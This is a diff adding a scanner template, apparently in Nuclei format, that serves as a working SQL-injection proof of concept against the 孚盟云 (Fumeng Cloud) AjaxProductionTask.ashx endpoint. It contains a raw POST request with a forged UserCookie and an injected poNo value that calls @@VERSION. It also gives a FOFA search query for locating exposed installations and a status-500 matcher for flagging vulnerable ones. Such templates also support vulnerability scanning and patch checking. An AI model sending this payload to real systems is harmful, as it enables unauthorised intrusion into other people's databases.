@@ -1,0 +1,26 @@
+id: poc-ygtomq0iogu24zm1
+info:
+  name: 孚盟云AjaxProductionTask存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ygtomq0iogu24zm1'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ygtomq0iogu24zm1
+    fofa: aapp="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/AjaxProductionTask.ashx HTTP/1.1
+
+    Cookie: UserCookie={"empId":"1","corpId": "1"}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    method=getProductionList&poNo=''-1/@@VERSION--'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
